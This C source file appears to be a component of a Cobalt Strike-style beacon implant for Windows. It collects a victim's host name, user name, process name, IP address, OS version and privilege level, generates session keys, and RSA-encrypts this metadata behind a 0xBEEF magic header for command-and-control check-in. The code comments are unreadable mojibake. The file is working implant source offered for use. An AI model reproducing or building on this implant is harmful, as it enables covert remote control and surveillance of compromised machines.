#include <Winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "IPHLPAPI.lib")
#include "MetaData.h"
#include "Util.h"
#include "Config.h"
#include <winternl.h>
#pragma warning(disable:4996)
extern unsigned char AESRandaeskey[16];
extern unsigned char Hmackey[16];
extern int clientID;

MakeMetaInfoResult MakeMetaInfo() {
    MakeMetaInfoResult nullResult = { NULL, 0 };

    // ���������
    unsigned char aesKey[16];
    if (!RandomAESKey(aesKey, sizeof(aesKey))) {
        fprintf(stderr, "Failed to generate AES key\n");
        return nullResult;
    }

    unsigned char hash[32];

    BOOL bSHA256 = SHA256_Hash(aesKey, 16, hash);

    if(!bSHA256) {
        fprintf(stderr, "SHA256_Hash failed\n");
        return nullResult;
	}

    // ǰ16�ֽ�Ϊ AES ��Կ
    memcpy(AESRandaeskey, hash, 16);
    // ��16�ֽ�Ϊ HMAC ��Կ 
    memcpy(Hmackey, hash + 16, 16); 

    size_t RandaeskeyLength = sizeof(aesKey);
    // ת��Ϊ uint8_t* ����
    uint8_t* RandaeskeyByteData = (uint8_t*)aesKey;

    size_t acpBytesWritten;
    // ��ȡ��ǰϵͳ�� ANSI ����ҳ
    unsigned char* acpBytes = GetCodePageANSI(&acpBytesWritten);
    if (acpBytes == NULL) {
        fprintf(stderr, "Failed to retrieve ANSI code page\n");
        return nullResult;
    }

    uint8_t* acpByteseData = (uint8_t*)acpBytes;
    size_t oemcpBytesWritten;
    // ��ȡ OEM ����ҳ���ֽ�����
    unsigned char* oemcpBytes = GetCodePageOEM(&oemcpBytesWritten);
    if (oemcpBytes == NULL) {
        fprintf(stderr, "Failed to retrieve OEM code page.\n");
        return nullResult;
    }

    uint8_t* oemcpBytesData = (uint8_t*)oemcpBytes;

    uint8_t clientIDBigEndian[4];

    // �������һ�� 6 λż��ΪBeaconId
    clientID = GenerateRandomInt(100000, 999998); 
    PutUint32BigEndian(clientIDBigEndian, (uint32_t)clientID);

    uint32_t processID = getpid();
    uint8_t processIDBigEndian[4];
    PutUint32BigEndian(processIDBigEndian, processID);

	// SSH �˿ڣ���ʱд��Ϊ 0
    uint16_t sshPort = 0; 
    uint8_t sshPortBigEndian[2];
    PutUint16BigEndian(sshPortBigEndian, sshPort);

    // �˺�����ȡ Flag������ Flag �����ж��Ƿ��ǹ���ԱȨ�޵�beacon���Ƿ���64λ�ܹ���beacon�Ƿ�64λ
    uint32_t metaDataFlag = GetMetaDataFlag(); 
    uint8_t flagBytes[1]; 
    flagBytes[0] = (uint8_t)metaDataFlag; 

    unsigned char* osVersion = GetOSVersion();

    uint32_t osMajorVersion = 0, osMinorVersion = 0, osBuild = 0;
    // ��������ϵͳ�汾��Ϣ
    sscanf_s(osVersion, "OS Version: %u.%u.%u", &osMajorVersion, &osMinorVersion, &osBuild);

    uint8_t osMajorVersionByte[1];
    uint8_t osMinorVersionByte[1];
    // �ض�
    osMajorVersionByte[0] = (uint8_t)osMajorVersion;
    osMinorVersionByte[0] = (uint8_t)osMinorVersion;

    uint8_t osBuildBytes[2]; 
    PutUint16BigEndian(osBuildBytes, osBuild);

    free(osVersion);

    uint32_t ptrFuncAddr = 0;       
    uint8_t ptrFuncAddrBytes[4];    
    PutUint32BigEndian(ptrFuncAddrBytes, ptrFuncAddr);

    // �����������ݺ� Smart Inject �й�
    // GetModuleHandleA
    uint32_t ptrGetModuleHanleAFuncAddr = 0;
    uint8_t ptrGetModuleHanleAFuncAddrBytes[4];
    PutUint32BigEndian(ptrGetModuleHanleAFuncAddrBytes, ptrGetModuleHanleAFuncAddr);

    // GetProcAddress
    uint32_t ptrGetProcAdressFuncAddr = 0;
    uint8_t ptrGetProcAdressFuncAddrBytes[4];
    PutUint32BigEndian(ptrGetProcAdressFuncAddrBytes, ptrGetProcAdressFuncAddr);

    uint32_t localIPInt = GetLocalIPInt();
    uint8_t localIPIntBytes[4];
    PutUint32BigEndian(localIPIntBytes, htonl(localIPInt));

    unsigned char* hostName = GetComputerNameAsString();
    if (!hostName) {
        fprintf(stderr, "hostNmae is NULL\n");
        free(acpBytes);
        free(oemcpBytes);
        return nullResult;
    }
    unsigned char* currentUser = GetUsername();   
    if (!currentUser) {
        fprintf(stderr, "currentUser is NULL\n");
        free(hostName);
        free(acpBytes);
        free(oemcpBytes);
        return nullResult;
    }
    unsigned char* processName = GetProcessName();
    if (!processName) {
        fprintf(stderr, "processName is NULL\n");
        free(hostName);
        free(acpBytes);
        free(oemcpBytes);
        free(currentUser);
        return nullResult;
    }

    // ���� \t, һ�� \0
    // ����������ֽ�
    size_t totalLength = strlen(hostName) + strlen(currentUser) + strlen(processName) + 2 + 1;
    unsigned char* osInfo = (unsigned char*)malloc(totalLength);

    if (!osInfo) {
        fprintf(stderr, "Memory allocation failed for osInfo\n");
        free(hostName);
        free(acpBytes);
        free(oemcpBytes);
        free(currentUser);
        free(processName);
        return nullResult;
    }

    // osInfo ���� \0
    snprintf(osInfo, totalLength, "%s\t%s\t%s", hostName, currentUser, processName);

    free(hostName);
    free(currentUser);
    free(processName);

    size_t osInfoLength = strlen(osInfo);
    uint8_t* osInfoByteData = (uint8_t*)osInfo;

    uint8_t MagicHead[4];
    // 0xBEEF
    uint8_t* magicHead = GetMagicHead(MagicHead);

    uint8_t* metaDataArrays[] = { clientIDBigEndian, processIDBigEndian, sshPortBigEndian, flagBytes, osMajorVersionByte,
        osMinorVersionByte, osBuildBytes, ptrFuncAddrBytes, ptrGetModuleHanleAFuncAddrBytes, ptrGetProcAdressFuncAddrBytes, localIPIntBytes, osInfoByteData };
    size_t metaDataSizes[] = { sizeof(clientIDBigEndian), sizeof(processIDBigEndian), sizeof(sshPortBigEndian), sizeof(flagBytes),
        sizeof(osMajorVersionByte), sizeof(osMinorVersionByte), sizeof(osBuildBytes), sizeof(ptrFuncAddrBytes),
        sizeof(ptrGetModuleHanleAFuncAddrBytes), sizeof(ptrGetProcAdressFuncAddrBytes), sizeof(localIPIntBytes), osInfoLength };
    size_t metaDataCounts = sizeof(metaDataArrays) / sizeof(metaDataArrays[0]);

    // ����Щ MetaData ��˳���
    uint8_t* metaData = CalcByte(metaDataArrays, metaDataSizes, metaDataCounts);
    
    size_t totalSize = 0;

    for (size_t i = 0; i < sizeof(metaDataSizes) / sizeof(metaDataSizes[0]); ++i) {
        totalSize += metaDataSizes[i];
    }

    uint8_t* metaInfoArrays[] = { RandaeskeyByteData, acpByteseData, oemcpBytesData, metaData };
    size_t metaInfoSizes[] = { RandaeskeyLength ,acpBytesWritten ,oemcpBytesWritten,totalSize };
    size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
    uint8_t* metaInfo = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
    size_t metaInfoTotalSize = 0;

    for (size_t i = 0; i < sizeof(metaInfoSizes) / sizeof(metaInfoSizes[0]); ++i) {
        metaInfoTotalSize += metaInfoSizes[i];
    }

    uint8_t bBytes[4];
    uint8_t* metaInfoLen = WriteInt(metaInfoTotalSize, bBytes);

    uint8_t* packetInfoArrays[] = { magicHead, metaInfoLen , metaInfo };
    size_t packetInfoSizes[] = { 4 ,4, metaInfoTotalSize };
    size_t packetInfoCounts = sizeof(packetInfoArrays) / sizeof(packetInfoArrays[0]);
    uint8_t* packetInfo = CalcByte(packetInfoArrays, packetInfoSizes, packetInfoCounts);
    size_t packetInfoTotalSize = 0;

    for (size_t i = 0; i < sizeof(packetInfoSizes) / sizeof(packetInfoSizes[0]); ++i) {
        packetInfoTotalSize += packetInfoSizes[i];
    }

    MakeMetaInfoResult MakeMetaInfoResult;

    MakeMetaInfoResult.MakeMeta = packetInfo;
    MakeMetaInfoResult.MakeMetaLen = packetInfoTotalSize;

    free(acpBytes);
    free(oemcpBytes);
    free(metaData);
    free(metaInfo);

    return MakeMetaInfoResult;
}

ULONG PemToCNG(PCSTR pszPem, BCRYPT_KEY_HANDLE* phKey)
{
    PBYTE pbDer = NULL;
    DWORD cbDer = 0;
    DWORD err = 0;
    PCERT_PUBLIC_KEY_INFO pPubKeyInfo = NULL;
    DWORD cbPubKeyInfo = 0;
    BOOL success;

    success = CryptStringToBinaryA(pszPem, 0, CRYPT_STRING_BASE64_ANY, NULL, &cbDer, NULL, NULL);
    if (!success) {
        return GetLastError();
    }

    pbDer = (PBYTE)malloc(cbDer);
    if (!pbDer) {
        return ERROR_OUTOFMEMORY;
    }

    success = CryptStringToBinaryA(pszPem, 0, CRYPT_STRING_BASE64_ANY, pbDer, &cbDer, NULL, NULL);
    if (!success) {
        err = GetLastError();
    }

    if (err == 0) {
        success = CryptDecodeObjectEx(
            X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
            X509_PUBLIC_KEY_INFO,
            pbDer, cbDer,
            CRYPT_DECODE_ALLOC_FLAG,
            NULL,
            &pPubKeyInfo,
            &cbPubKeyInfo
        );

        if (!success) {
            err = GetLastError();
        }
    }

    if (err == 0) {
        success = CryptImportPublicKeyInfoEx2(
            X509_ASN_ENCODING,
            pPubKeyInfo,
            0,
            NULL,
            phKey
        );

        if (!success) {
            err = GetLastError();
        }
    }

    if (pbDer) {
        free(pbDer);
    }

    if (pPubKeyInfo) {
        LocalFree(pPubKeyInfo);
    }

    return err;
}


// ʹ�� CNG ����Ԫ����
EncryMetadataResult EncryMetadata()
{
    EncryMetadataResult result = { 0 };
    BCRYPT_KEY_HANDLE hKey = NULL;

    // ��ȡ������ PEM ��Կ
    if (PemToCNG(pub_key_str, &hKey) != 0 || !hKey) {
        fprintf(stderr, "Importing PEM public key failed\n");
        return result;
    }

    // ��ȡԭʼԪ������Ϣ
    MakeMetaInfoResult meta = MakeMetaInfo();
    uint8_t* pSrcData = meta.MakeMeta;
    ULONG cbSrcData = (ULONG)meta.MakeMetaLen;

    if (!pSrcData || cbSrcData == 0) {
        fprintf(stderr, "MakeMetaInfo failed\n");
        BCryptDestroyKey(hKey);
        return result;
    }

    // ��ȡ��Կ�����ܳ���
    DWORD cbEncrypted = 0;
    NTSTATUS status = BCryptEncrypt(
        hKey,
        pSrcData, cbSrcData,
        NULL,
        NULL, 0,
        NULL, 0,
        &cbEncrypted,
        BCRYPT_PAD_PKCS1);

    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Failed to estimate encryption length:%lu\n", GetLastError());
        free(pSrcData);
        BCryptDestroyKey(hKey);
        return result;
    }

    // ������ܻ�����
    unsigned char* pEncrypted = (unsigned char*)malloc(cbEncrypted);
    if (!pEncrypted) {
        fprintf(stderr, "Memory allocation failed\n");
        free(pSrcData);
        BCryptDestroyKey(hKey);
        return result;
    }

    // ִ�м���
    status = BCryptEncrypt(
        hKey,
        pSrcData, cbSrcData,
        NULL,
        NULL, 0,
        pEncrypted, cbEncrypted,
        &cbEncrypted,
        BCRYPT_PAD_PKCS1);

    free(pSrcData);

    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "BCryptEncrypt Failed With Error:%lu\n", GetLastError());
        free(pEncrypted);
        BCryptDestroyKey(hKey);
        return result;
    }

    result.EncryMetadata = pEncrypted;
    result.EncryMetadataLen = cbEncrypted;

    BCryptDestroyKey(hKey);
    return result;
}

// �ж� beacon �� OS �ܹ�
BOOL IsOSX64() {
    SYSTEM_INFO systemInfo;
    GetNativeSystemInfo(&systemInfo);

    // 64 λ
    if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
        systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        return TRUE;
    }
    // �� 64 λ
    else {
        return FALSE; 
    }
}

unsigned char* GetOSVersion() {
    LPSTR lpNtdll = "ntdll.dll";
    HINSTANCE hModule = LoadLibraryA(lpNtdll);
    if (hModule == NULL) {
        fprintf(stderr, "LoadLibraryA Failed With Error:%lu\n", GetLastError());
        return NULL;
    }

    typedef NTSTATUS(WINAPI* PFN_RTLGETVERSION)(LPOSVERSIONINFOEXW);
    PFN_RTLGETVERSION pRtlGetVersion = (PFN_RTLGETVERSION)GetProcAddress(hModule, "RtlGetVersion");
    if (pRtlGetVersion == NULL) {
        fprintf(stderr, "GetProcAddress Failed With Error:%lu\n", GetLastError());
        FreeLibrary(hModule);
        return NULL;
    }

    OSVERSIONINFOEXW osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXW));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

    // ���� RtlGetVersion ������ȡ����ϵͳ�汾��Ϣ
    NTSTATUS status = pRtlGetVersion(&osvi);
    if (status != 0) {
        fprintf(stderr, "RtlGetVersion Failed With Error:%lu\n", status);
        FreeLibrary(hModule);
        return NULL;
    }

    FreeLibrary(hModule);

    size_t len = snprintf(NULL, 0, "OS Version: %lu.%lu.%lu", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber) + 1;
    unsigned char* osVersion = (unsigned char*)malloc(len);
    if (osVersion != NULL) {
        snprintf(osVersion, len, "OS Version: %lu.%lu.%lu", osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber);
        return osVersion;
    }
    else {
        fprintf(stderr, "Memory allocation failed for osVersion\n");
        return NULL;
    }
}

uint32_t GetMetaDataFlag() {
    uint32_t flagInt = 0;

    if (IsHighPriv()) { 
        flagInt += 8;
    }

    BOOL isOSx64 = IsOSX64();
    if (isOSx64) {
        flagInt += 4;
    }

    BOOL isProcessX64 = IsProcessX64();
    if (isProcessX64) {
        flagInt += 2;
    }
    return flagInt;
}


BOOL IsHighPriv() {
    HANDLE hToken;
    TOKEN_ELEVATION elevation;
    DWORD size;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        fprintf(stderr, "OpenProcessToken Failed With Error:%lu\n", GetLastError());
        return FALSE;
    }

    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
        CloseHandle(hToken);
        fprintf(stderr, "GetTokenInformation Failed With Error:%lu\n", GetLastError());
        return FALSE;
    }

    CloseHandle(hToken);

    // �����ʾ����Ȩ
    return elevation.TokenIsElevated;
}

BOOL IsProcessX64() {
#if defined(_WIN64)
    return TRUE; // ����Ϊ64λӦ��
#else
    return FALSE; // ����Ϊ32λӦ��
#endif
}

uint32_t GetLocalIPInt() {
    PIP_ADAPTER_INFO pAdapterInfo = NULL;
    ULONG outBufLen = 0;
    DWORD ret = GetAdaptersInfo(NULL, &outBufLen);
    if (ret != ERROR_BUFFER_OVERFLOW) {
        return 0;
    }

    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(outBufLen);
    if (!pAdapterInfo) {
        return 0;
    }

    ret = GetAdaptersInfo(pAdapterInfo, &outBufLen);
    if (ret != ERROR_SUCCESS) {
        free(pAdapterInfo);
        return 0;
    }

    uint32_t ip = 0;
    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
    // ������������ IP ��ַ
    while (pAdapter) {
        IP_ADDR_STRING* pAddress = &(pAdapter->IpAddressList);
        // ����ÿһ�������� IP ��ַ
        while (pAddress) {
            const char* ipAddress = pAddress->IpAddress.String;
            // ���� APIPA (169.254.x.x) ��δ�����ַ (0.0.0.0)
            if (strncmp(ipAddress, "169.254.", 8) != 0 &&
                strcmp(ipAddress, "0.0.0.0") != 0) {
                struct in_addr addr;
                if (inet_pton(AF_INET, ipAddress, &addr) == 1) {
                    ip = ntohl(addr.s_addr); // ת��Ϊ�����ֽ���
                    break;
                }
            }
            pAddress = pAddress->Next;
        }
        if (ip != 0) {
            break;
        }
        pAdapter = pAdapter->Next;
    }

    free(pAdapterInfo);
    return ip;
}

unsigned char* GetComputerNameAsString() {
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    unsigned char* computerName = (unsigned char*)malloc(size);

    if (!computerName) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    if (!GetComputerNameW(computerName, &size)) {
        fprintf(stderr, "GetComputerNameW Failed With Error:%lu\n", GetLastError());
        free(computerName);
        return NULL;
    }

    // ���Ȱ��� \0
    int mbLen = WideCharToMultiByte(CP_UTF8, 0, computerName, -1, NULL, 0, NULL, NULL);
    unsigned char* mbComputerName = (unsigned char*)malloc(mbLen);
    if (!mbComputerName) {
        free(computerName);
        fprintf(stderr, "Memory allocation Failed\n");
        return NULL;
    }

    // ���� \0
    WideCharToMultiByte(CP_UTF8, 0, computerName, -1, mbComputerName, mbLen, NULL, NULL);

    return mbComputerName;
}


unsigned char* GetUsername() {
    DWORD size = UNLEN + 1;
    unsigned char* userName = (unsigned char*)malloc(size);

    if (!userName) {
        fprintf(stderr, "Memory allocation Failed\n");
        return NULL;
    }

    // ���� \0
    if (!GetUserNameA(userName, &size)) {
        fprintf(stderr, "GetUserNameA Failed With Error:%lu\n", GetLastError());
        free(userName);
        return NULL;
    }

    return userName;
}

unsigned char* GetProcessName() {
    unsigned char* processName;
    DWORD size = MAX_PATH + 1;
    processName = (unsigned char*)malloc(size + 1);

    if (!processName) {
        fprintf(stderr, "Memory allocation failed for processName\n");
        return NULL;
    }

    if (!GetModuleFileNameA(NULL, processName, size)) {
        fprintf(stderr, "GetModuleFileNameA Failed With Error:%lu\n", GetLastError());
        free(processName);
        return NULL;
    }

    // ���� \ ֮����ַ���
    // ���� / ֮����ַ���
    unsigned char* baseName = (unsigned char*)strrchr(processName, '\\');
    if (!baseName) baseName = (unsigned char*)strrchr(processName, '/');
    if (baseName) baseName++;
    else baseName = (unsigned char*)processName;

    size_t len = strlen((char*)baseName);
    unsigned char* finalName = (unsigned char*)malloc(len + 1);
    if (!finalName) {
        fprintf(stderr, "Memory allocation failed for processName\n");
        free(processName);
        return NULL;
    }

    memcpy(finalName, baseName, len);
    finalName[len] = '\0';
    free(processName);
    return finalName;
}

unsigned char* GetCodePageANSI(size_t* bytesWritten) {
    UINT acp = GetACP();
    unsigned char* acpBytes = (unsigned char*)malloc(2);
    if (acpBytes == NULL) {
        fprintf(stderr, "Memory allocation failed for acpBytes\n");
        *bytesWritten = 0;
        return NULL;
    }

    // �� acp ת��Ϊ�ֽ����У�������洢�� acpBytes ��
    acpBytes[0] = (unsigned char)(acp & 0xFF);
    acpBytes[1] = (unsigned char)((acp >> 8) & 0xFF);

    // ���÷��ص��ֽ���
    *bytesWritten = 2;

    return acpBytes;
}

unsigned char* GetCodePageOEM(size_t* bytesWritten) {
    uint32_t oemcp = GetOEMCP();

    // �����洢 OEM ����ҳ������
    unsigned char* oemcpBytes = (unsigned char*)malloc(2);
    if (oemcpBytes == NULL) {
        fprintf(stderr, "Memory allocation failed for oemcpBytes\n");
        *bytesWritten = 0;
        return NULL;
    }

    // �� oemcp ת��Ϊ�ֽ����У�������洢�� oemcpBytes ��
    oemcpBytes[0] = (unsigned char)(oemcp & 0xFF);
    oemcpBytes[1] = (unsigned char)((oemcp >> 8) & 0xFF);

    // ���÷��ص��ֽ���
    *bytesWritten = 2;

    return oemcpBytes;
}

uint8_t* GetMagicHead(uint8_t* MagicHead) {
    uint16_t MagicNum = 0xBEEF;

    PutUint32BigEndian(MagicHead, MagicNum);
    return MagicHead;
}